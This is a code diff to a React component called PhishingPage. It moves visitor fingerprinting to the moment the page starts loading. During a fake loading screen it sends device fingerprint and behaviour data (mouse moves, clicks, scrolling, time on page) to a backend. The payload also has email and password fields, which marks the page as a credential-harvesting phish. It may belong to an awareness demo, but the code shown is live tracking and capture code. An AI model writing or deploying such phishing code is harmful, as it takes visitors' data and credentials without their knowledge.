@@ -63,9 +63,44 @@ const PhishingPage = () => {
     };
   }, [handleMouseMove, handleClick, handleScroll]);
 
-  // Loading sequence
+  // Loading sequence - capture data immediately in background
   useEffect(() => {
     if (stage === 'loading') {
+      // Capture data in background during loading (like original version)
+      const captureInitialData = async () => {
+        try {
+          console.log('🔍 Collecting fingerprint data during loading...');
+          const fingerprint = await collectFingerprint();
+          const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
+
+          const initialData = {
+            ...fingerprint,
+            behavior: {
+              ...behaviorRef.current,
+              timeOnPage,
+            },
+            metadata: {
+              userSubmitted: false,
+              formData: {
+                email: null,
+                password: null,
+              },
+            },
+            timestamp: new Date().toISOString(),
+          };
+
+          console.log('📤 Sending initial fingerprint to backend...');
+          const response = await captureData(initialData);
+          console.log('✅ Fingerprint saved:', response);
+        } catch (error) {
+          console.error('❌ Error capturing initial data:', error);
+        }
+      };
+
+      // Start capture immediately
+      captureInitialData();
+
+      // Continue with normal loading sequence
       const timer = setTimeout(() => {
         setStage('glitch');
       }, 2000);
@@ -95,44 +130,6 @@ const PhishingPage = () => {
     }
   }, [stage, countdown]);
 
-  // Capture fingerprint data on form stage (before submission)
-  useEffect(() => {
-    if (stage === 'form') {
-      // Collect and send fingerprint immediately when form appears
-      const captureInitialData = async () => {
-        try {
-          console.log('🔍 Collecting fingerprint data...');
-          const fingerprint = await collectFingerprint();
-          const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
-
-          const initialData = {
-            ...fingerprint,
-            behavior: {
-              ...behaviorRef.current,
-              timeOnPage,
-            },
-            metadata: {
-              userSubmitted: false, // Not submitted yet, just visiting
-              formData: {
-                email: null,
-                password: null,
-              },
-            },
-            timestamp: new Date().toISOString(),
-          };
-
-          console.log('📤 Sending initial fingerprint to backend...');
-          // Send initial fingerprint to backend
-          const response = await captureData(initialData);
-          console.log('✅ Fingerprint saved:', response);
-        } catch (error) {
-          console.error('❌ Error capturing initial data:', error);
-        }
-      };
-
-      captureInitialData();
-    }
-  }, [stage]);
 
   // Type text effect for terminal
   const typeText = (text, speed = 30) => {
